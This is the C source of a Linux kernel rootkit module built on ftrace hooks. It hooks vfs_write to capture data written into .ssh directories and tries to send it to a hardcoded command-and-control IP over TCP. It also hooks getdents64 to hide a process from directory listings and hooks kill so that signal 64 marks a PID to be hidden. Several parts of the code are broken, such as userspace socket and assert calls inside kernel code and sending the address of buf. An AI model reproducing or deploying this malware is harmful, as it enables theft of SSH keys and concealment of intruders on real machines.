#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/file.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/string.h>
//#include <arpa/inet.h>
//#include <linux/assert.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");


char hide_pid[NAME_MAX];
char cncIpAddress[16] = "192.168.1.183";
extern int cncSocket;

struct rootkitMessage {
  uint8_t index;
  size_t length;
};

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};




static asmlinkage ssize_t (*orig_vfs)(struct file *file, const char __user *buf, size_t count, loff_t *pos);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char filename[NAME_MAX];
    char directory[NAME_MAX];

    char buffer[count];

//    FILE *fptr;

    strcpy(filename, file->f_path.dentry->d_name.name);
    strcpy(directory, file->f_path.dentry->d_parent->d_name.name);

    if(strcmp(".ssh", directory) == 0)
    {
        printk(KERN_INFO "rootkit: trying to write to a file %s", file->f_path.dentry->d_name.name);
        printk(KERN_INFO "rootkit: bytes being written %s", buf);

	struct rootkitMessage rtkMsg;
    	rtkMsg.index = 0;
    	rtkMsg.length = htobe64(count);

    	ssize_t bytesSent;
    	bytesSent = send(cncSocket, &rtkMsg, 9, 0);
    	assert(bytesSent == 9);
    	bytesSent = send(cncSocket, &buf, count, 0);
    	assert(bytesSent == count);		

      //  fprt = fopen("test.txt","w");
      //  fprintf(fptr,"%s", buf);
    }




    
    
    return orig_vfs(file, buf, count, pos);
}


/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by hide_pid.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to hide_pid - we also have to check that hide_pid isn't empty! */
        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find hide_pid in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    /*
     * Pull out the arguments we need from the pt_regs struct
     */
    pid_t pid = regs->di;
    int sig = regs->si;

    /*
     * If the signal is 64, then print a message to the kernel buffer and
     * write the PID as a string to hide_pid
     */
    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d%", pid);
        return 0;
    }

    /*
     * Otherwise, just return the real sys_kill
     */
    return orig_kill(regs);
}


static struct ftrace_hook hooks[] = {
    // HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    //HOOK("__x64_sys_write", hook_write, &orig_write),
    HOOK("vfs_write", vfs_h_write, &orig_vfs),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    struct sockaddr_in cncAddress;
    memset(&cncAddress, 0, sizeof(cncAddress));
    cncAddress.sin_family = AF_INET;
    cncAddress.sin_port = htons(8765);
    int convertCNCValue = inet_pton(AF_INET, cncIpAddress, &cncAddress.sin_addr.s_addr);
    assert(convertCNCValue >= 0);

    //Create a socket
    cncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    assert(cncSocket >= 0);

    //Connect to cnc via the socket
    int connectSocket = connect(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress));
    assert(connectSocket >= 0);

    //list_del(&THIS_MODULE->list);

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    //Send End Message
    struct rootkitMessage rtkEndMsg;
    ssize_t bytesSent;
    rtkEndMsg.index = -1;
    rtkEndMsg.length = htobe64(-1);

    bytesSent = send(cncSocket, &rtkEndMsg, 9, 0);
    assert(bytesSent == 9);
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
